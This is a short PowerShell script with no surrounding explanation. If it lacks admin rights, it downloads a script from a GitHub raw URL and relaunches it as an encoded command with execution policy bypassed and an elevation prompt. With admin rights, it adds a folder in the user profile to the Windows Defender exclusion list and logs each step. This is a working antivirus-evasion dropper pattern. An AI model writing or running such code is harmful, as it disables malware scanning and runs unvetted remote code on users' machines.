$log = "$env:TEMP\defender_debug_log.txt"

$foldersToEnsure = @(
    "$env:USERPROFILE\TestSafeFolder"
)

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$admin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $admin) {
    Add-Content $log "[$(Get-Date)] Not admin. Relaunching..."
    try {
        $url = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1"
        $script = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
        $encoded = [Convert]::ToBase64String($bytes)
        Start-Process powershell.exe "-ExecutionPolicy Bypass -EncodedCommand $encoded" -Verb RunAs
    } catch {
        Add-Content $log "[$(Get-Date)] Relaunch failed: $_"
    }
    exit
}

Add-Content $log "[$(Get-Date)] Running as admin."

try {
    $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
    Add-Content $log "[$(Get-Date)] Got exclusions."
} catch {
    Add-Content $log "[$(Get-Date)] Error getting exclusions: $_"
    exit
}

$missing = $foldersToEnsure | Where-Object { $_ -notin $currentExclusions }

foreach ($folder in $missing) {
    try {
        New-Item -ItemType Directory -Force -Path $folder | Out-Null
        Add-MpPreference -ExclusionPath $folder
        Add-Content $log "[$(Get-Date)] Added: $folder"
    } catch {
        Add-Content $log "[$(Get-Date)] Failed to add $folder: $_"
    }
}
